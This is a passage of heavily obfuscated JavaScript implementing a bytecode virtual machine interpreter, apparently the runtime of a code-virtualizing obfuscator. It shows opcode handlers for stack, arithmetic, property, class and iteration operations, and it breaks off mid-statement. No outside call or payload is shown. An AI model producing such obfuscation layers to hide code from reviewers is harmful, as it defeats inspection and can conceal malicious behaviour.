ib=iU=>{K[t++]=iU;},iQ=()=>K[--t],ic=()=>K[t-0x1],iX=iU=>{K[t-0x1]=iU;},iz=iU=>K[t-iU],io=(iU,iT)=>{K[t-iU]=iT;};let iM=iU=>iU,ih={['_$bXCHhp']:H,['_$xk0pxV']:vmc(null)};if(I)for(let iU=0x0;iU<Math['min'](I['length'],V['p']||0x0);iU++){q[iU]=I[iU];}let iG=iu&&I?o(I):null,iR=null,iN=![];iE&&(!ih['_$B27Lwo']&&(ih['_$B27Lwo']=vmc(null)),ih['_$B27Lwo']['__this__']=!![]);x(V,ih,Z);while(i0<i5){try{while(i0<i5){let iT=i0<<0x1,iW=i2[iT],im=id[iW],iL=i2[iT+0x1];if(iW===n){let iV=iQ(),iI=yield{['_$YB5bX8']:p,['_$1dVUjw']:iV};ib(iI),i0++;continue;}if(iW===J){let ie=iQ(),iH=yield{['_$YB5bX8']:E,['_$1dVUjw']:ie};if(iH&&typeof iH==='object'&&iH['_$YB5bX8']===g){let iZ=iH['_$1dVUjw'];if(i6['length']>0x0){let iA=i6[i6['length']-0x1];if(iA['_$At0dut']!==undefined){i8['_$01ziIx']=!![],i8['_$BtMLgv']=iZ,i0=iA['_$At0dut'];continue;}}return iZ;}ib(iH),i0++;continue;}if(iW===v){let iD=iQ(),iK=yield{['_$YB5bX8']:Y,['_$1dVUjw']:iD};ib(iK),i0++;continue;}if(!ij)var iO=![],iS,il=![],ix=![],ir=![],is=![],iC=![],iP=undefined,iB=null,iF=null,ij=[function(it){dY:{K[t++]=i1[it],i0++;}},function(it){dY:{K[t++]=undefined,i0++;}},function(it){dY:{K[t++]=null,i0++;}},function(it){dY:{K[--t],i0++;}},function(it){dY:{let iq=K[t-0x1];K[t++]=iq,i0++;}},function(it){dY:{let iq=K[t-0x1];K[t-0x1]=K[t-0x2],K[t-0x2]=iq,i0++;}},function(it){dY:{K[t++]=q[it],i0++;}},function(it){dY:{q[it]=K[--t],i0++;}},function(it){dY:{K[t++]=I[it],i0++;}},function(it){dY:{I[it]=K[--t],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0+iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0-iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0*iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0/ iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0%iq,i0++;}},function(it){dY:{K[t-0x1]=-K[t-0x1],i0++;}},function(it){dY:{let iq=K[--t];K[t++]=typeof iq===k?iq+0x1n:+iq+0x1,i0++;}},function(it){dY:{let iq=K[--t];K[t++]=typeof iq===k?iq-0x1n:+iq-0x1,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0**iq,i0++;}},function(it){dY:{K[t-0x1]=+K[t-0x1],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0&iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0|iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0^iq,i0++;}},function(it){dY:{K[t-0x1]=~K[t-0x1],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0<<iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0>>iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0>>>iq,i0++;}},function(it){dY:{let iq=K[t-0x3],d0=K[t-0x2],d1=K[t-0x1];K[t-0x3]=d0,K[t-0x2]=d1,K[t-0x1]=iq,i0++;}},function(it){dY:{let iq=K[--t];K[t++]=typeof iq===k?iq:+iq,i0++;}},function(it){dY:{K[t-0x1]=String(K[t-0x1]),i0++;}},,,function(it){dY:{K[t-0x1]=!K[t-0x1],i0++;}},,,,,,,,function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0==iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0!=iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0===iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0!==iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0<iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0<=iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0>iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0>=iq,i0++;}},,,function(it){dY:{i0=iM(i3[i0]);}},function(it){dY:{K[--t]?i0=iM(i3[i0]):i0++;}},function(it){dY:{!K[--t]?i0=iM(i3[i0]):i0++;}},function(it){dY:{let iq=K[--t];iq!==null&&iq!==undefined?i0=iM(i3[i0]):i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=vmJ_a0ee8c['_$eT2ZGH'];vmJ_a0ee8c['_$eT2ZGH']=undefined;try{let d2=d0['apply'](undefined,X(iQ,iq));K[t++]=d2;}finally{vmJ_a0ee8c['_$eT2ZGH']=d1;}i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[--t];if(typeof d0!=='function')throw new TypeError(d0+'\x20is\x20not\x20a\x20function');let d2=vmJ_a0ee8c['_$FWZbSq'],d3=d2&&d2['get'](d0),d4=vmJ_a0ee8c['_$eT2ZGH'];d3&&(vmJ_a0ee8c['_$ZQtJCU']=!![],vmJ_a0ee8c['_$eT2ZGH']=d3);try{let d5=d0['apply'](d1,X(iQ,iq));K[t++]=d5;}finally{d3&&(vmJ_a0ee8c['_$ZQtJCU']=![],vmJ_a0ee8c['_$eT2ZGH']=d4);}i0++;}},function(it){dY:{if(i6['length']>0x0){let iq=i6[i6['length']-0x1];if(iq['_$At0dut']!==undefined){i8['_$01ziIx']=!![],i8['_$BtMLgv']=K[--t],i0=iq['_$At0dut'];break dY;}}i8['_$01ziIx']&&(i8['_$01ziIx']=![],i8['_$BtMLgv']=undefined);iO=!![],iS=K[--t];return;}},function(it){dY:{throw K[--t];}},function(it){dY:{let iq=i4[i0];i6['push']({['_$8iJwHv']:iq[0x0]>=0x0?iM(iq[0x0]):undefined,['_$At0dut']:iq[0x1]>=0x0?iM(iq[0x1]):undefined,['_$zj9zHS']:iq[0x2]>=0x0?iM(iq[0x2]):undefined,['_$czTq5L']:t}),i0++;}},function(it){dY:{i6['pop'](),i0++;}},function(it){dY:{let iq=K[--t];if(it!=null){let d0=i1[it];iF['_$xk0pxV'][d0]=iq;}i0++;}},function(it){dY:{if(i6['length']>0x0){let iq=i6[i6['length']-0x1];iq['_$At0dut']===i0&&(iq['_$pdsKoy']!==undefined&&(i7=iq['_$pdsKoy']),i6['pop']());}i0++;}},function(it){dY:{if(i8['_$01ziIx']){let iq=i8['_$BtMLgv'];i8['_$01ziIx']=![],i8['_$BtMLgv']=undefined,iO=!![],iS=iq;return;}if(i9['_$6MmH4c']){let d0=i9['_$5TjbWq'];i9['_$6MmH4c']=![],i9['_$5TjbWq']=0x0,i0=d0;break dY;}if(ii['_$Or4AH1']){let d1=ii['_$TTuHhF'];ii['_$Or4AH1']=![],ii['_$TTuHhF']=0x0,i0=d1;break dY;}if(i7!==null){let d2=i7;i7=null;throw d2;}i0++;}},function(it){dY:{let iq=iM(i3[i0]);if(i6['length']>0x0){let d0=i6[i6['length']-0x1];if(d0['_$At0dut']!==undefined&&iq>=d0['_$zj9zHS']){i9['_$6MmH4c']=!![],i9['_$5TjbWq']=iq,i0=d0['_$At0dut'];break dY;}}i0=iq;}},function(it){dY:{let iq=iM(i3[i0]);if(i6['length']>0x0){let d0=i6[i6['length']-0x1];if(d0['_$At0dut']!==undefined&&iq>=d0['_$zj9zHS']){ii['_$Or4AH1']=!![],ii['_$TTuHhF']=iq,i0=d0['_$At0dut'];break dY;}}i0=iq;}},,,,,,function(it){dY:{let iq=K[--t],d0=i1[it];if(iq===null||iq===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(d0)+'\x27\x20of\x20'+iq);K[t++]=iq[d0],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it];if(d0===null||d0===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(d1)+'\x27\x20of\x20'+d0);if(il){if(!Reflect['set'](d0,d1,iq))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(d1)+'\x27\x20of\x20object');}else d0[d1]=iq;K[t++]=iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];if(d0===null||d0===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(iq)+'\x27\x20of\x20'+d0);K[t++]=d0[iq],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[--t];if(d1===null||d1===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(d0)+'\x27\x20of\x20'+d1);if(il){if(!Reflect['set'](d1,d0,iq))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(d0)+'\x27\x20of\x20object');}else d1[d0]=iq;K[t++]=iq,i0++;}},function(it){dY:{let iq,d0;it!=null?(d0=K[--t],iq=i1[it]):(iq=K[--t],d0=K[--t]);let d1=delete d0[iq];if(il&&!d1)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(iq)+'\x27\x20of\x20object');K[t++]=d1,i0++;}},function(it){dY:{let iq=i1[it],d0;if(vmJ_a0ee8c['_$SZo6qA']&&iq in vmJ_a0ee8c['_$SZo6qA'])throw new ReferenceError('Cannot\x20access\x20\x27'+iq+'\x27\x20before\x20initialization');if(iq in vmJ_a0ee8c)d0=vmJ_a0ee8c[iq];else{if(iq in vmk)d0=vmk[iq];else throw new ReferenceError(iq+'\x20is\x20not\x20defined');}K[t++]=d0,i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it];if(vmJ_a0ee8c['_$SZo6qA']&&d0 in vmJ_a0ee8c['_$SZo6qA'])throw new ReferenceError('Cannot\x20access\x20\x27'+d0+'\x27\x20before\x20initialization');let d1=!(d0 in vmJ_a0ee8c)&&!(d0 in vmk);vmJ_a0ee8c[d0]=iq,d0 in vmk&&(vmk[d0]=iq),d1&&(vmk[d0]=iq),K[t++]=iq,i0++;}},function(it){dY:{K[t++]={},i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it];iq===null||iq===undefined?K[t++]=undefined:K[t++]=iq[d0],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0 in iq,i0++;}},,function(it){dY:{let iq=K[--t],d0=K[t-0x1];iq!==null&&iq!==undefined&&Object['assign'](d0,iq),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];d0===null||d0===undefined?K[t++]=undefined:K[t++]=d0[iq],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it];vmQ(d0,d1,{'value':iq,'writable':!![],'enumerable':!![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[--t];vmQ(d1,d0,{'value':iq,'writable':!![],'enumerable':!![],'configurable':!![]}),i0++;}},,,,,,function(it){dY:{K[t++]=[],i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1];d0['push'](iq),i0++;}},,function(it){dY:{let iq=K[--t],d0={'value':iq};b['add'](d0),K[t++]=d0,i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1];if(Array['isArray'](iq))Array['prototype']['push']['apply'](d0,iq);else for(let d1 of iq){d0['push'](d1);}i0++;}},function(it){dY:{let iq=K[t-0x1];iq['length']++,i0++;}},,,,,function(it){dY:{let iq=K[--t],d0=d(iq),d1=d0&&d0['a'],d2=d0&&d0['s'],d3=d0&&d0['g'],d4=d0&&d0['m'],d5=d0&&d0['p']||0x0,d6=d0&&d0['st'],d7=d1?iP:undefined,d8=iF,d9;if(d3)d9=B(L,o,iq,d8,Q,d6,vmk,w);else{if(d2){if(d1)d9=j(f,iq,d8,d7);else d4?d9=U(f,o,iq,d8,d6,vmk,w):d9=P(f,o,iq,d8,d6,vmk,w);}else{if(d1)d9=F(m,iq,d8,d7);else d4?d9=y(m,o,iq,d8,d6,vmk,w):d9=C(m,o,iq,d8,d6,vmk,w);}}c(d9,'length',{'value':d5,'writable':![],'enumerable':![],'configurable':!![]}),K[t++]=d9,i0++;}},,,,function(it){dY:{let iq=K[--t],d0=X(iQ,iq),d1=K[--t];if(typeof d1!=='function')throw new TypeError(d1+'\x20is\x20not\x20a\x20constructor');if(Q['has'](d1))throw new TypeError(d1['name']+'\x20is\x20not\x20a\x20constructor');let d2=vmJ_a0ee8c['_$eT2ZGH'];vmJ_a0ee8c['_$eT2ZGH']=undefined;let d3;try{d3=Reflect['construct'](d1,d0);}finally{vmJ_a0ee8c['_$eT2ZGH']=d2;}K[t++]=d3,i0++;}},function(it){dY:{let iq=K[--t],d0=X(iQ,iq),d1=K[--t];if(it===0x1){K[t++]=d0,i0++;break dY;}if(vmJ_a0ee8c['_$54tFhZ']){i0++;break dY;}let d2=vmJ_a0ee8c['_$tAOTDF'];if(d2){let d3=d2['parent'],d4=d2['newTarget'],d5=Reflect['construct'](d3,d0,d4);D&&D!==d5&&vmz(D)['forEach'](function(d6){!(d6 in d5)&&(d5[d6]=D[d6]);});D=d5,iC=!![];is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);i0++;break dY;}if(typeof d1!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmJ_a0ee8c['_$tFZE09']=A;try{let d6=d1['apply'](D,d0);d6!==undefined&&d6!==D&&typeof d6==='object'&&(D&&Object['assign'](d6,D),D=d6),iC=!![],is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);}catch(d7){if(d7 instanceof TypeError&&(d7['message']['includes']('\x27new\x27')||d7['message']['includes']('constructor'))){let d8=Reflect['construct'](d1,d0,A);d8!==D&&D&&Object['assign'](d8,D),D=d8,iC=!![],is&&(R(iF,'__this__'),iF['_$xk0pxV']['__this__']=D);}else throw d7;}finally{delete vmJ_a0ee8c['_$tFZE09'];}i0++;}},function(it){dY:{let iq=K[--t];K[t++]=import(iq),i0++;}},,,,function(it){dY:{K[t-0x1]=typeof K[t-0x1],i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t];K[t++]=d0 instanceof iq,i0++;}},function(it){dY:{let iq=i1[it];iq in vmJ_a0ee8c?K[t++]=typeof vmJ_a0ee8c[iq]:K[t++]=typeof vmk[iq],i0++;}},,,,,,,,,,,function(it){dY:{let iq=K[--t],d0=iq['next']();K[t++]=d0,i0++;}},function(it){dY:{let iq=K[--t];iq&&typeof iq['return']==='function'&&iq['return'](),i0++;}},,,function(it){dY:{let iq=K[--t];if(iq==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+iq);let d0=iq[Symbol['iterator']];if(typeof d0!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');K[t++]=d0['call'](iq),i0++;}},function(it){dY:{let iq=K[--t];K[t++]=!!iq['done'],i0++;}},function(it){dY:{let iq=K[--t];if(iq==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+iq);let d0=iq[Symbol['asyncIterator']];if(typeof d0==='function')K[t++]=d0['call'](iq);else{let d1=iq[Symbol['iterator']];if(typeof d1!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');K[t++]=d1['call'](iq);}i0++;}},function(it){dY:{let iq=K[--t],d0=iq['next']();K[t++]=Promise['resolve'](d0),i0++;}},function(it){dY:{let iq=K[--t];iq&&typeof iq['return']==='function'?K[t++]=Promise['resolve'](iq['return']()):K[t++]=Promise['resolve'](),i0++;}},function(it){dY:{let iq=K[--t];K[t++]=z(iq),i0++;}},,,,,,,,function(it){dY:{let iq=K[--t],d0=K[--t],d1=it,d2=function(d3,d4){let d5=function(){if(d3){d4&&(vmJ_a0ee8c['_$upMhyP']=d5);let d6='_$tFZE09'in vmJ_a0ee8c;!d6&&(vmJ_a0ee8c['_$tFZE09']=new.target);try{let d7=d3['apply'](this,o(arguments));if(d4&&d7!==undefined&&(typeof d7!=='object'||d7===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return d7;}finally{d4&&delete vmJ_a0ee8c['_$upMhyP'],!d6&&delete vmJ_a0ee8c['_$tFZE09'];}}};return d5;}(d0,d1);iq&&vmQ(d2,'name',{'value':iq,'configurable':!![]}),K[t++]=d2,i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1];if(iq===null){vmM(d0['prototype'],null),vmM(d0,Function['prototype']),d0['_$QZL7TU']=null,i0++;break dY;}let d1=![];try{let d2=vmc(iq['prototype']),d3=iq['apply'](d2,[]);d3!==undefined&&d3!==d2&&(d1=!![]);}catch(d4){d4 instanceof TypeError&&(d4['message']['includes']('\x27new\x27')||d4['message']['includes']('constructor')||d4['message']['includes']('Illegal\x20constructor'))&&(d1=!![]);}if(d1){let d5=d0,d6=vmJ_a0ee8c,d7='_$tFZE09',d8='_$upMhyP',d9='_$tAOTDF';function di(...dd){let du=vmc(iq['prototype']);d6[d9]={'parent':iq,'newTarget':new.target||di},d6[d8]=new.target||di;let dw=d7 in d6;!dw&&(d6[d7]=new.target);try{let dp=d5['apply'](du,dd);dp!==undefined&&typeof dp==='object'&&(du=dp);}finally{delete d6[d9],delete d6[d8],!dw&&delete d6[d7];}return du;}di['prototype']=vmc(iq['prototype']),di['prototype']['constructor']=di,vmM(di,iq),vmz(d5)['forEach'](function(dd){dd!=='prototype'&&dd!=='length'&&dd!=='name'&&c(di,dd,vmX(d5,dd));});d5['prototype']&&(vmz(d5['prototype'])['forEach'](function(dd){dd!=='constructor'&&c(di['prototype'],dd,vmX(d5['prototype'],dd));}),vmo(d5['prototype'])['forEach'](function(dd){c(di['prototype'],dd,vmX(d5['prototype'],dd));}));K[--t],K[t++]=di,di['_$QZL7TU']=iq,i0++;break dY;}vmM(d0['prototype'],iq['prototype']),vmM(d0,iq),d0['_$QZL7TU']=iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=vmJ_a0ee8c['_$eT2ZGH'],d2=d1?vmh(d1):h(d0),d3=G(d2,iq);if(d3['desc']&&d3['desc']['get']){let d5=d3['desc']['get']['call'](d0);K[t++]=d5,i0++;break dY;}if(d3['desc']&&d3['desc']['set']&&!('value'in d3['desc'])){K[t++]=undefined,i0++;break dY;}let d4=d3['proto']?d3['proto'][iq]:d2[iq];if(typeof d4==='function'){let d6=d3['proto']||d2,d7=d4['bind'](d0),d8=d4['constructor']&&d4['constructor']['name'],d9=d8==='GeneratorFunction'||d8==='AsyncFunction'||d8==='AsyncGeneratorFunction';!d9&&(!vmJ_a0ee8c['_$FWZbSq']&&(vmJ_a0ee8c['_$FWZbSq']=new WeakMap()),vmJ_a0ee8c['_$FWZbSq']['set'](d7,d6)),K[t++]=d7;}else K[t++]=d4;i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[--t],d2=h(d1),d3=G(d2,d0);d3['desc']&&d3['desc']['set']?d3['desc']['set']['call'](d1,iq):d1[d0]=iq,K[t++]=iq,i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it];vmQ(d0['prototype'],d1,{'value':iq,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it],d2=M(d0);vmQ(d2,d1,{'get':iq,'enumerable':d2===d0,'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it],d2=M(d0);vmQ(d2,d1,{'set':iq,'enumerable':d2===d0,'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it];vmQ(d0,d1,{'value':iq,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it];vmQ(d0,d1,{'get':iq,'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[t-0x1],d1=i1[it];vmQ(d0,d1,{'set':iq,'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it],d1=S(),d2='get_'+d0,d3=d1['get'](d2);if(d3&&d3['has'](iq)){let d7=d3['get'](iq);K[t++]=d7['call'](iq),i0++;break dY;}let d4='_$0KTMKI'+'get_'+d0['substring'](0x1)+'_$LXBHEb';if(iq['constructor']&&d4 in iq['constructor']){let d8=iq['constructor'][d4];K[t++]=d8['call'](iq),i0++;break dY;}let d5=d1['get'](d0);if(d5&&d5['has'](iq)){K[t++]=d5['get'](iq),i0++;break dY;}let d6=r(d0);if(d6 in iq){K[t++]=iq[d6],i0++;break dY;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+d0+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it],d2=S(),d3='set_'+d1,d4=d2['get'](d3);if(d4&&d4['has'](d0)){let d8=d4['get'](d0);d8['call'](d0,iq),K[t++]=iq,i0++;break dY;}let d5='_$0KTMKI'+'set_'+d1['substring'](0x1)+'_$LXBHEb';if(d0['constructor']&&d5 in d0['constructor']){let d9=d0['constructor'][d5];d9['call'](d0,iq),K[t++]=iq,i0++;break dY;}let d6=d2['get'](d1);if(d6&&d6['has'](d0)){d6['set'](d0,iq),K[t++]=iq,i0++;break dY;}let d7=r(d1);if(d7 in d0){d0[d7]=iq,K[t++]=iq,i0++;break dY;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+d1+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it],d2=S();!d2['has'](d1)&&d2['set'](d1,new WeakMap());let d3=d2['get'](d1);if(d3['has'](d0))throw new TypeError('Cannot\x20initialize\x20'+d1+'\x20twice\x20on\x20the\x20same\x20object');d3['set'](d0,iq),i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it],d1=![],d2=l();if(d2){let d3=d2['get'](d0);d3&&d3['has'](iq)&&(d1=!![]);}K[t++]=d1,i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it],d2=null,d3=l();if(d3){let d6=d3['get'](d1);d6&&d6['has'](d0)&&(d2=d6['get'](d0));}if(d2===null){let d7=s(d1);d7 in d0&&(d2=d0[d7]);}if(d2===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+d1+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof d2!=='function')throw new TypeError(d1+'\x20is\x20not\x20a\x20function');let d4=X(iQ,iq),d5=d2['apply'](d0,d4);K[t++]=d5,i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it];if(iq==null){K[t++]=undefined,i0++;break dY;}let d1=S(),d2=d1['get'](d0);if(!d2||!d2['has'](iq))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+d0+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');K[t++]=d2['get'](iq),i0++;}},function(it){dY:{let iq=K[--t];K[--t];let d0=K[t-0x1],d1=i1[it],d2=S();!d2['has'](d1)&&d2['set'](d1,new WeakMap());let d3=d2['get'](d1);d3['set'](d0,iq),i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it],d1=l();if(d1){let d4='get_'+d0,d5=d1['get'](d4);if(d5&&d5['has'](iq)){let d7=d5['get'](iq);K[t++]=d7['call'](iq),i0++;break dY;}let d6=d1['get'](d0);if(d6&&d6['has'](iq)){K[t++]=d6['get'](iq),i0++;break dY;}}let d2='_$0KTMKI'+'get_'+d0['substring'](0x1)+'_$LXBHEb';if(d2 in iq){let d8=iq[d2];K[t++]=d8['call'](iq),i0++;break dY;}let d3=r(d0);if(d3 in iq){K[t++]=iq[d3],i0++;break dY;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+d0+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=i1[it],d2=l();if(d2){let d5='set_'+d1,d6=d2['get'](d5);if(d6&&d6['has'](d0)){let d8=d6['get'](d0);d8['call'](d0,iq),K[t++]=iq,i0++;break dY;}let d7=d2['get'](d1);if(d7&&d7['has'](d0)){d7['set'](d0,iq),K[t++]=iq,i0++;break dY;}}let d3='_$0KTMKI'+'set_'+d1['substring'](0x1)+'_$LXBHEb';if(d3 in d0){let d9=d0[d3];d9['call'](d0,iq),K[t++]=iq,i0++;break dY;}let d4=r(d1);if(d4 in d0){d0[d4]=iq,K[t++]=iq,i0++;break dY;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+d1+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}},,function(it){dY:{if(ir&&!iC)throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');K[t++]=D,i0++;}},function(it){dY:{if(iR===null){if(il||!ix){iR=[];let iq=iB||I;if(iq)for(let d0=0x0;d0<iq['length'];d0++){iR[d0]=iq[d0];}if(il){let d1=function(){throw new TypeError('\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them');};vmQ(iR,'callee',{'get':d1,'set':d1,'enumerable':![],'configurable':![]});}else vmQ(iR,'callee',{'value':Z,'writable':!![],'enumerable':![],'configurable':!![]});}else{let d2=I?I['length']:0x0,d3={},d4=function(d8){return typeof d8==='string'?parseInt(d8,0xa):NaN;},d5=function(d8){return!isNaN(d8)&&d8>=0x0;},d6=function(d8){return d8<I['length']?I[d8]:d3[d8];},d7=function(d8){return d8<I['length']?d8 in I:d8 in d3;};iR=new Proxy([],{'get':function(d8,d9,di){if(d9==='length')return d2;if(d9==='callee')return Z;if(d9===Symbol['iterator'])return function(){let dw=0x0;return{'next':function(){if(dw<d2)return{'value':d6(dw++),'done':![]};return{'done':!![]};}};};let dd=d4(d9);if(d5(dd))return d6(dd);if(d9==='hasOwnProperty')return function(dw){if(dw==='length'||dw==='callee')return!![];let dp=d4(dw);return d5(dp)&&dp<d2&&d7(dp);};let du=Array['prototype'][d9];if(typeof du==='function')return function(){let dw=[];for(let dp=0x0;dp<d2;dp++){dw[dp]=d6(dp);}return du['apply'](dw,arguments);};return undefined;},'set':function(d8,d9,di){if(d9==='length')return d2=di,!![];let dd=d4(d9);if(d5(dd))return dd<I['length']?I[dd]=di:d3[dd]=di,dd>=d2&&(d2=dd+0x1),!![];return!![];},'has':function(d8,d9){if(d9==='length'||d9==='callee')return!![];let di=d4(d9);if(d5(di)&&di<d2)return d7(di);return d9 in Array['prototype'];},'deleteProperty':function(d8,d9){let di=d4(d9);return d5(di)&&(di<I['length']?delete I[di]:delete d3[di]),!![];},'getOwnPropertyDescriptor':function(d8,d9){if(d9==='callee')return{'value':Z,'writable':!![],'enumerable':![],'configurable':!![]};if(d9==='length')return{'value':d2,'writable':!![],'enumerable':![],'configurable':!![]};let di=d4(d9);if(d5(di)&&di<d2&&d7(di))return{'value':d6(di),'writable':!![],'enumerable':!![],'configurable':!![]};return undefined;},'ownKeys':function(d8){let d9=[];for(let di=0x0;di<d2;di++){d7(di)&&d9['push'](String(di));}return d9['push']('length','callee'),d9;}});}}K[t++]=iR,i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>0x10,d1=i1[iq],d2=i1[d0];K[t++]=new RegExp(d1,d2),i0++;}},function(it){dY:{K[--t],K[t++]=undefined,i0++;}},function(it){dY:{K[t++]=A,i0++;}},function(it){dY:{K[t++]=vma[it],i0++;}},function(it){dY:{K[t++]=vmb[it],i0++;}},function(it){dY:{if(it===-0x1)K[t++]=Symbol();else{let iq=K[--t];K[t++]=Symbol(iq);}i0++;}},function(it){dY:{let iq=i1[it];K[t++]=Symbol['for'](iq),i0++;}},function(it){dY:{let iq=K[--t];K[t++]=Symbol['keyFor'](iq),i0++;}},,,,,,,,,,,function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1];vmQ(d1['prototype'],d0,{'value':iq,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1];vmQ(d1,d0,{'value':iq,'writable':!![],'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1],d2=M(d1);vmQ(d2,d0,{'get':iq,'enumerable':d2===d1,'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1],d2=M(d1);vmQ(d2,d0,{'set':iq,'enumerable':d2===d1,'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1];vmQ(d1,d0,{'get':iq,'enumerable':![],'configurable':!![]}),i0++;}},function(it){dY:{let iq=K[--t],d0=K[--t],d1=K[t-0x1];vmQ(d1,d0,{'set':iq,'enumerable':![],'configurable':!![]}),i0++;}},,,,,,,,,,,,,,,function(it){dY:{debugger;i0++;}},function(it){dY:{i0++;}},function(it){dY:{iO=!![],iS=t>0x0?K[--t]:undefined;return;}},,,,,,,,function(it){dY:{let iq=K[--t],d0={['_$xk0pxV']:vmc(null),['_$iShk8n']:vmc(null),['_$B27Lwo']:vmc(null),['_$bXCHhp']:iq};iF=d0,i0++;}},function(it){dY:{let iq=i1[it];if(iq==='__this__'){let 